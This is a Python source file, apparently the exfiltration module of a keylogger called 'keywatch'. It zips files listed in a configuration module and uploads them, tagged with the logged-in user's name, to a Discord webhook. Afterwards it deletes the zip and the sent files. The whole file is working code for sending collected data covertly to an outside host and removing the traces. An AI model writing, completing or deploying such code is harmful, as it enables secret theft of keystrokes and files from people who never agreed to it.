import zipfile
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from cfg import *


class FileSender:
    def __init__(self, webhook_url=WEBHOOK_URL):
        self.files = None
        self.zip_name = None
        self.webhook_url = webhook_url

    @staticmethod
    def _generate_filename():
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"keywatch_{timestamp}.zip"

    def execute(self):
        """Run the process of creating and sending the zip file."""
        self.zip_name = self._generate_filename()
        self.files = cfg_get_files2send()

        self.create_zip()
        success = self.send_zip_via_webhook()
        if success:
            cfg_cleanup_sent_files(self.files)

    def create_zip(self):
        """Create a zip file with the specified files."""
        with zipfile.ZipFile(self.zip_name, 'w') as zipf:
            for file in self.files:
                if os.path.exists(file):  # Check if the file exists
                    zipf.write(file)
        # print(f"{self.zip_name} created successfully!")

    def send_zip_via_webhook(self):
        """Send the zip file via Discord webhook."""
        if not self.webhook_url:
            print("Webhook URL not provided.")
            return

        webhook = DiscordWebhook(url=self.webhook_url)

        # Message details
        end_dt = datetime.now().strftime('%d/%m/%Y %H:%M')
        username = os.getlogin()
        embed = DiscordEmbed(
            title=f"Received message from ({username}) @ Time: {end_dt}",
            description=self.zip_name
        )
        webhook.add_embed(embed)

        # Add files
        with open(self.zip_name, 'rb') as f:
            webhook.add_file(file=f.read(), filename=self.zip_name)
        os.remove(self.zip_name)

        # Execute the webhook
        print(f"{self.zip_name} sent to WebHook")
        response = webhook.execute()
        return True if response.status_code == 200 else False
